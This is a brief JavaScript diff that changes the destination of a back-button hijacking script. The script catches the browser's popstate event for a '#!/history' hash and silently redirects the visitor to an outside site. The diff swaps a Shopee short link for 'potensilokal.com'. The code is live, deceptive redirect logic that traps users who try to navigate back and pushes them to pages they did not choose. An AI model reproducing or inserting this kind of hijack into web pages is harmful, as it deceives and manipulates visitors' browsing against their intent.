@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://shope.ee/1Aurcqlsen"); 
+      location.replace("https://potensilokal.com"); 
     },10); 
   } 
 }, false); 
